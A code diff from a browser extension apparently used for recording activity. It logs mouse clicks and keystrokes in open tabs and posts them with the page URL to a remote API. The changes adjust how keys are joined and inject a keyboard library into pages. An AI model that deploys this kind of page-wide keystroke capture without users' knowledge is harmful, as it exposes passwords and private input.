@@ -55,14 +55,14 @@ $(document).ready(() => {
                 // console.log("[REST] Sending mouse click data", dataObj);
                 actionPostApi(currentToken, dataObj);
             } else if (request.source === "keyboard") {
-                console.log("Keyboard event recorded ", request.data);
                 let keyEvent = request.data;
+                console.log("Keyboard event recorded ", keyEvent.join(' '));
                 dataObj = {
                     action: 'keystrokes',
                     tabId: deviceClickActiveTab.tabId,
                     url: deviceClickActiveTab.url,
                     windowId: deviceClickActiveTab.windowId,
-                    keys: keyEvent.join()
+                    keys: keyEvent.join(' ')
                 }
                 actionPostApi(currentToken, dataObj);
             }
@@ -169,8 +169,10 @@ function addDeviceEventListeners(tabId, windowId, url) {
     // Mouseclick event gets reset when a new url is navigated to in the same tab
 
     // TEST -- Change urls on the same page and see how many listeners get added
-    chrome.tabs.executeScript(tabId, {file: './js/pageEventListeners.js'}, () => {
-        console.log("[CALLBACK] Injected script in other page");
+    chrome.tabs.executeScript(tabId, {file: './js/keyboard.min.js'}, () => {
+        chrome.tabs.executeScript(tabId, {file: './js/pageEventListeners.js'}, () => {
+            console.log("[CALLBACK] Injected script in other page");
+        });
     });
 }
 
